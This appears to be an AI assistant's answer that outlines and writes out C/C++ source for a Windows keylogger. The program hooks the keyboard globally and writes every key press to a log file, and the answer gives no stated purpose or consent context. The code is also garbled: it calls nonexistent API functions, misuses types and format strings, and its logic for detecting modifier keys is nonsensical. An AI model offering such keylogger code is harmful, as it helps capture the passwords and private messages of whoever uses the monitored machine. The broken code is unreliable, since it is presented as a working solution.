To create a keystroke-logging application, we'll use Windows API functions to set up a keyboard hook and capture key presses. Here's a structured approach:

### Key Components:

1. **Keyboard Hook Setup**:
   - Use `SetWindowsHook` to install a global keyboard hook.
   - This allows the program to capture all keyboard events.

2. **Loop and Event Handling**:
   - Use a loop to continuously monitor keyboard events.
   - Check each key press using `GetKeyState` for both down and up events.

3. **Key State Handling**:
   - Convert key numbers to characters using `GetChar`.
   - Track modifier keys (Shift, Ctrl, Alt) alongside other keys.

4. **File Logging**:
   - Append keystrokes to a file using `fopen` and `fwrite`.
   - Include error handling for file operations.

5. **Performance and Safety**:
   - Use `Sleep` to prevent high CPU usage.
   - Ensure the hook is removed upon program termination.

6. **Cleanup and Termination**:
   - Remove the hook using `UnhookKeyboard`.
   - Release resources and close the file.

### Code Structure:

```c
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>

#define MAX_KEYSTROKE 1000

using namespace std;

void InitializeLogFile(const char* filename) {
    FILE* file = fopen(filename, "a");
    if (!file) {
        cerr << "Failed to open log file." << endl;
        exit(1);
    }
    return file;
}

void ReleaseLogFile(FILE* file) {
    if (file) {
        fclose(file);
    }
}

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hook = SetWindowsHook(WH_KEYBOARD_ALL, keyboardHookProcedure);

    if (!hook) {
        cerr << "Failed to install keyboard hook." << endl;
        return 1;
    }

    FILE* file = InitializeLogFile("keystrokes.log");
    bool running = true;
    double lastTime = 0;

    while (running) {
        Sleep(100); // Prevent high CPU usage

        double currentTime = time(nullptr);
        if ((currentTime - lastTime) > 1.0) { // Check every second
            lastTime = currentTime;
            // Release mouse and keyboard input
            ReleaseMouseInput();
            ReleaseKeyboardInput();
        }

        // Check for key events
        MSG msg;
        while (GetMessage(&msg, hwnd, 0, 0)) {
            if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                WPARAM wparam = msg.wparam;
                int key = (int)wparam;
                int shift = (key & 0x1) ? 1 : 0; // Check if Shift is pressed
                int ctrl = (key & 0x2) ? 1 : 0;
                int alt = (key & 0x4) ? 1 : 0;

                if (msg.message == WM_KEYDOWN) {
                    // Record key down event
                    // Example: Convert to char
                    char c = GetChar(key, shift, ctrl, alt);
                    // Append to file
                    fprintf(file, "[%s] %c %d %d %d\n", c, shift, ctrl, alt);
                } else if (msg.message == WM_KEYUP) {
                    // Record key up event
                    // No need to log unless needed
                }
            }
        }

        if (msg.message != -1) { // Break when no more messages
            running = false;
        }
    }

    ReleaseLogFile(file);
    UnhookKeyboard(hook);
    return 0;
}
```

